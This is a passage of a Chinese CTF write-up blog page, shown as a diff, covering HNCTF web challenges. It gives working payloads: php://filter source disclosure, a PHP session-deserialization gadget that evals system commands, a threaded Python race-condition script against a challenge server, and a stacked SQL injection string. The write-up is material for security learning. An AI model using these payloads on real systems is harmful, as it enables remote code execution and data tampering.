+<li>流量抓取到真的题目位置：Rea1web3he11.php，根据提示 t00llll,访问t00llll.php 得到查看源码的方法，协议读取</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">include_</span>=php://filter/convert.base<span class="number">64</span>-encode/resource=Rea<span class="number">1</span>web<span class="number">3</span>he<span class="number">11</span>.php</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>php 反序列化</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">webshell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$caution</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; caution = <span class="keyword">new</span> execution();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; caution -&gt; world_execute();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">caution</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">world_execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Webshell初&amp;#%始*$%&amp;^化,$))(&amp;*(%#^**ERROR**#@$()&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">execution</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; cmd = <span class="string">&quot;system(&#x27;find / -name flag*&#x27;);&quot;</span>;</span><br><span class="line">        <span class="comment"># $this -&gt; cmd = &quot;phpinfo();&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">world_execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> webshell();</span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=addslashes(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span>=str_replace(<span class="string">&quot;O:8:&quot;</span>,<span class="string">&quot;|O:8:&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">···<span class="keyword">echo</span></span><br><span class="line">|O:<span class="number">8</span>:\<span class="string">&quot;webshell\&quot;:1:&#123;s:7:\&quot;caution\&quot;;O:9:\&quot;execution\&quot;:1:&#123;s:3:\&quot;cmd\&quot;;s:29:\&quot;system(\&#x27;find / -name flag*\&#x27;);\&quot;;&#125;&#125;</span></span><br><span class="line"><span class="string">···</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>这个地方注意，我们只需要转义 ’  &quot;  ’ 双引号，而如果转义了单引号会导致序列化后的对象命令无法执行，所以最后传参的payload如下：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:8:\&quot;webshell\&quot;:1:&#123;s:7:\&quot;caution\&quot;;O:9:\&quot;execution\&quot;:1:&#123;s:3:\&quot;cmd\&quot;;s:29:\&quot;system(<span class="string">&#x27;find / -name flag*&#x27;</span>);\&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>条件竞争</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        et.wait()</span><br><span class="line">        url = <span class="string">&#x27;http://120.48.91.102:40888/Rea1web3he11.php&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DNT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=aaaaaa&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        proxy = &#123;</span><br><span class="line">        <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;aaaaaa&#x27;</span>&#125;</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">r&#x27;|O:8:\&quot;webshell\&quot;:1:&#123;s:7:\&quot;caution\&quot;;O:9:\&quot;execution\&quot;:1:&#123;s:3:\&quot;cmd\&quot;;s:10:\&quot;phpinfo();\&quot;;&#125;&#125;&#x27;</span>,f,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) <span class="comment">#,proxies=proxy</span></span><br><span class="line">        resp.encoding=<span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(resp.content.decode(<span class="string">&#x27;utf-8&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># if len(resp.text)&lt;2000:</span></span><br><span class="line">        <span class="comment">#     print(&#x27;[+++++]retry&#x27;)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;))</span></span><br><span class="line">        <span class="comment">#     et.clear()</span></span><br><span class="line">        <span class="comment">#     print(&#x27;success!&#x27;)</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    et=threading.Event()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        threading.Thread(target=exp,).start()</span><br><span class="line">    et.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>抓包</li>
+</ol>
+<h2 id="fun-sql">fun_sql</h2>
+<ol>
+<li>堆叠注入</li>
+<li>payload</li>
+</ol>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%27</span>;<span class="keyword">insert</span><span class="meta">%20into</span><span class="meta">%20ccctttfff</span><span class="meta">%20values</span>(<span class="meta">%272</span><span class="meta">%27</span>,<span class="meta">%27aa</span><span class="meta">%27</span>,<span class="meta">%27asdas</span><span class="meta">%27</span>);SELECT<span class="meta">%201</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">%20</span><span class="meta">%271</span></span><br></pre></td></tr></table></figure>
+<h1></h1>
+<p>HNCTF官方wp<br>
+Pwn wp:<a target="_blank" rel="noopener" href="https://hxz3zo0taq.feishu.cn/docx/doxcn7rfTxf8pk2UhNexjMOLQhb">https://hxz3zo0taq.feishu.cn/docx/doxcn7rfTxf8pk2UhNexjMOLQhb</a><br>
+Reverse wp:<a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/doxcnFESSimJ4UEvZK9ja8ZnArg">https://dqgom7v7dl.feishu.cn/docx/doxcnFESSimJ4UEvZK9ja8ZnArg</a><br>
+Web wp:<a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/doxcnfAleQyWvxtaviJQUyfedGd">https://dqgom7v7dl.feishu.cn/docx/doxcnfAleQyWvxtaviJQUyfedGd</a><br>
+Crypto wp:<a target="_blank" rel="noopener" href="https://hxz3zo0taq.feishu.cn/docx/doxcnN6eRa9M02PQXrBr2dZ0pWg">https://hxz3zo0taq.feishu.cn/docx/doxcnN6eRa9M02PQXrBr2dZ0pWg</a><br>
+Misc wp：<a target="_blank" rel="noopener" href="https://nbkixd94d9.feishu.cn/docx/UFbrdq4iVoas5Ox365Wcp9HcnCh">https://nbkixd94d9.feishu.cn/docx/UFbrdq4iVoas5Ox365Wcp9HcnCh</a></p>
 
 
         <hr>
@@ -1189,7 +1275,7 @@ guess =&gt; num 猜测字符的 ascii 码<br>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MISC</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#UP-DOWN-Aussie"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">UP&amp;DOWN_Aussie</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#pdf-png"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">pdf &amp;&amp; png</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%9C%8B%E4%B8%8D%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">看不见的代码</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-3"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-%E5%A4%A9%E4%B9%A6"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">NSSCTF 天书</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-4"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-Bronya"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">NSSCTF Bronya</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-5"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-0"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">NSSCTF jail level 0</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-6"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-1"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">NSSCTF jail level 1</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-7"><span class="toc-nav-number">1.7.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-2"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">NSSCTF jail level 2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-8"><span class="toc-nav-number">1.8.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-2-5"><span class="toc-nav-number">1.9.</span> <span class="toc-nav-text">NSSCTF jail level 2.5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-9"><span class="toc-nav-number">1.9.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-3"><span class="toc-nav-number">1.10.</span> <span class="toc-nav-text">NSSCTF jail level 3</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-10"><span class="toc-nav-number">1.10.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4"><span class="toc-nav-number">1.11.</span> <span class="toc-nav-text">NSSCTF jail level 4</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-11"><span class="toc-nav-number">1.11.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level4-0-5"><span class="toc-nav-number">1.12.</span> <span class="toc-nav-text">NSSCTF jail level4.0.5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-12"><span class="toc-nav-number">1.12.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4-1"><span class="toc-nav-number">1.13.</span> <span class="toc-nav-text">NSSCTF jail level 4.1</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-13"><span class="toc-nav-number">1.13.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4-2"><span class="toc-nav-number">1.14.</span> <span class="toc-nav-text">NSSCTF jail level 4.2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-14"><span class="toc-nav-number">1.14.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-4-3"><span class="toc-nav-number">1.15.</span> <span class="toc-nav-text">NSSCTF jail level 4.3</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-15"><span class="toc-nav-number">1.15.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-5"><span class="toc-nav-number">1.16.</span> <span class="toc-nav-text">NSSCTF jail level 5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-16"><span class="toc-nav-number">1.16.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-6"><span class="toc-nav-number">1.17.</span> <span class="toc-nav-text">NSSCTF jail level 6</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-17"><span class="toc-nav-number">1.17.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-7"><span class="toc-nav-number">1.18.</span> <span class="toc-nav-text">NSSCTF jail level 7</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-18"><span class="toc-nav-number">1.18.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-s-Fe-safeeval"><span class="toc-nav-number">1.19.</span> <span class="toc-nav-text">NSSCTF s@Fe safeeval</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-19"><span class="toc-nav-number">1.19.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-python2-jail"><span class="toc-nav-number">1.20.</span> <span class="toc-nav-text">NSSCTF python2 jail</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-20"><span class="toc-nav-number">1.20.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-lake-lake-lake"><span class="toc-nav-number">1.21.</span> <span class="toc-nav-text">NSSCTF jail lake lake lake</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-21"><span class="toc-nav-number">1.21.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-l-ke-l-ke-l-ke"><span class="toc-nav-number">1.22.</span> <span class="toc-nav-text">## NSSCTF jail l@ke l@ke l@ke</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-22"><span class="toc-nav-number">1.22.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-laKe-laKe-laKe"><span class="toc-nav-number">1.23.</span> <span class="toc-nav-text">NSSCTF laKe laKe laKe</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-23"><span class="toc-nav-number">1.23.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-Side-channel-pyjail-tyPe-Ch-nnEl"><span class="toc-nav-number">1.24.</span> <span class="toc-nav-text">NSSCTF Side-channel&#x2F;pyjail: tyPe Ch@nnEl</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-24"><span class="toc-nav-number">1.24.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">WEB</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Challenge-RCE"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">Challenge RCE</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-25"><span class="toc-nav-number">2.1.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#easy-unser"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">easy_unser</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-26"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#easy-include"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">easy_include</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-27"><span class="toc-nav-number">2.3.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CanYouRCE"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">CanYouRCE</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-28"><span class="toc-nav-number">2.4.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ez-phar"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text">ez_phar</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-29"><span class="toc-nav-number">2.5.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#logjjjjlogjjjj"><span class="toc-nav-number">2.6.</span> <span class="toc-nav-text">logjjjjlogjjjj</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-30"><span class="toc-nav-number">2.6.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SSTI"><span class="toc-nav-number">2.7.</span> <span class="toc-nav-text">SSTI</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-31"><span class="toc-nav-number">2.7.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MISC</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#UP-DOWN-Aussie"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">UP&amp;DOWN_Aussie</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">题目描述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#pdf-png"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">pdf &amp;&amp; png</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%9C%8B%E4%B8%8D%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">看不见的代码</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-3"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-%E5%A4%A9%E4%B9%A6"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">NSSCTF 天书</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-4"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-Bronya"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">NSSCTF Bronya</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-5"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-guessnumber-%EF%BC%88ACM%EF%BC%89"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">NSSCTF guessnumber （ACM）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-6"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-0"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">NSSCTF jail level 0</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E8%A7%A3-7"><span class="toc-nav-number">1.7.1.</span> <span class="toc-nav-text">题解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NSSCTF-jail-level-1"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">NSSCTF 